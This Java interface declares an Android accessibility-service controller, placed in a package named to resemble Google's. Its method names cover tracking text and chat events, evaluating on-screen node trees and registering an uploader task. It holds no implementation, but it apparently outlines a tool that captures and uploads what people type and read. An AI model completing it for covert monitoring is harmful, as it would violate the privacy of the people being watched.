package service.android.google.com.accessibility.controller;

import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import service.android.google.com.accessibility.model.ASEvent;

public interface AccessibilityServiceController {

    void toggleEventTracking(final boolean isEnabled);

    void toggleTextEventTracking(final boolean isEnabled);

    void toggleChatEventTracking(final boolean isEnabled);

    void unSubscribe();

    void evaluateEvent(final AccessibilityNodeInfo rootInActiveWindow, final AccessibilityEvent accessibilityEvent);

    void evaluateEvent(final ASEvent event);

    void handleError(final Throwable e);

    void registerUploaderTask();
}